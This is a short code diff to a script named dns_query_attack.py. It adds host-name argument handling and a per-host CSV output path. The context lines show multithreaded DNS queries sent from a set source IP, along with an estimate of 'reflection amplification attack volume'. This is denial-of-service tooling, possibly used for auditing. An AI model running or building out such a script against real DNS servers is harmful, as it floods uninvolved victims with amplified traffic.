@@ -10,6 +10,7 @@ import threading
 import time
 import queue
 import os
+import sys
 
 
 
@@ -79,6 +80,13 @@ def send_custom_dns_query(src_ip, dns_server, domain):
     
 # Send NUM_THREADS x NUM_QUERIES DNS queries
 if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print("Usage: python dns_query_attack.py <host_name>")
+        sys.exit(1)
+
+    # get host name
+    host_name = sys.argv[1]
+
     threads = []
     for i in range(NUM_THREADS):
         t = threading.Thread(target=send_custom_dns_query, args=(SRC_IP, DNS_SERVER, QUERY_DOMAIN))
@@ -95,6 +103,7 @@ if __name__ == "__main__":
     print(f"Approximate reflection amplification attack volume: {BYTE_COUNTER.get() * approximate_amplification_factor}bytes")
     
     # Save the DNS queries to a file
+    DNS_QUERIES_FILE = f"audit/dns_queries_{host_name}.csv"
     if not os.path.exists(os.path.dirname(DNS_QUERIES_FILE)):
         os.makedirs(os.path.dirname(DNS_QUERIES_FILE))
 
